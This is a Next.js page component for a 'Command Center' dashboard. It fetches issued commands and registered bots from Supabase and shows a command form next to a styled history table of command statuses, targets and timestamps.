import { createClient } from "@/lib/supabase/server";
import CommandForm from "./CommandForm";

export const dynamic = "force-dynamic";

async function getCommands() {
    const supabase = await createClient();
    const { data } = await supabase
        .from("commands")
        .select("*, bots!inner(hostname)")
        .order("created_at", { ascending: false })
        .limit(50);
    return data || [];
}

async function getBotIds() {
    const supabase = await createClient();
    const { data } = await supabase
        .from("bots")
        .select("bot_id, hostname")
        .order("last_seen_at", { ascending: false });
    return data || [];
}

export default async function CommandsPage() {
    const [commands, bots] = await Promise.all([getCommands(), getBotIds()]);

    return (
        <div>
            {/* Header */}
            <div className="mb-8">
                <h1 className="text-2xl font-bold text-white">Command Center</h1>
                <p className="text-zinc-500 text-sm mt-1">Issue commands and monitor execution</p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Command Form (1/3) */}
                <div>
                    <CommandForm bots={bots} />
                </div>

                {/* Command History (2/3) */}
                <div className="lg:col-span-2">
                    <div className="bg-zinc-900/60 backdrop-blur border border-zinc-800/50 rounded-2xl overflow-hidden">
                        <div className="px-6 py-4 border-b border-zinc-800/50">
                            <h2 className="text-sm font-semibold text-white">Command History</h2>
                        </div>
                        {commands.length === 0 ? (
                            <div className="px-6 py-16 text-center">
                                <div className="text-4xl mb-3">📡</div>
                                <p className="text-zinc-400 font-medium">No commands issued yet</p>
                                <p className="text-zinc-600 text-sm mt-1">Use the form to send your first command.</p>
                            </div>
                        ) : (
                            <table className="w-full">
                                <thead>
                                    <tr className="border-b border-zinc-800/50">
                                        <th className="text-left px-6 py-3 text-xs font-semibold text-zinc-500 uppercase tracking-wider">Status</th>
                                        <th className="text-left px-6 py-3 text-xs font-semibold text-zinc-500 uppercase tracking-wider">Command</th>
                                        <th className="text-left px-6 py-3 text-xs font-semibold text-zinc-500 uppercase tracking-wider">Target</th>
                                        <th className="text-left px-6 py-3 text-xs font-semibold text-zinc-500 uppercase tracking-wider">Issued</th>
                                        <th className="text-left px-6 py-3 text-xs font-semibold text-zinc-500 uppercase tracking-wider">Executed</th>
                                    </tr>
                                </thead>
                                <tbody className="divide-y divide-zinc-800/30">
                                    {commands.map((cmd) => (
                                        <tr key={cmd.id} className="hover:bg-zinc-800/20 transition-colors">
                                            <td className="px-6 py-3">
                                                <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-lg text-xs font-medium ${cmd.status === "executed" ? "bg-emerald-500/15 text-emerald-400" :
                                                        cmd.status === "delivered" ? "bg-blue-500/15 text-blue-400" :
                                                            cmd.status === "pending" ? "bg-amber-500/15 text-amber-400" :
                                                                "bg-red-500/15 text-red-400"
                                                    }`}>
                                                    {cmd.status}
                                                </span>
                                            </td>
                                            <td className="px-6 py-3">
                                                <code className="text-sm text-zinc-300 bg-zinc-800/50 px-2 py-0.5 rounded">{cmd.command_type}</code>
                                            </td>
                                            <td className="px-6 py-3 text-sm text-zinc-400">
                                                {(cmd as Record<string, unknown>).bots && typeof (cmd as Record<string, unknown>).bots === 'object' && ((cmd as Record<string, unknown>).bots as Record<string, unknown>).hostname
                                                    ? String(((cmd as Record<string, unknown>).bots as Record<string, unknown>).hostname)
                                                    : cmd.bot_id.slice(0, 12) + '...'}
                                            </td>
                                            <td className="px-6 py-3 text-xs text-zinc-500">{new Date(cmd.created_at).toLocaleString()}</td>
                                            <td className="px-6 py-3 text-xs text-zinc-500">{cmd.executed_at ? new Date(cmd.executed_at).toLocaleString() : "—"}</td>
                                        </tr>
                                    ))}
                                </tbody>
                            </table>
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
}
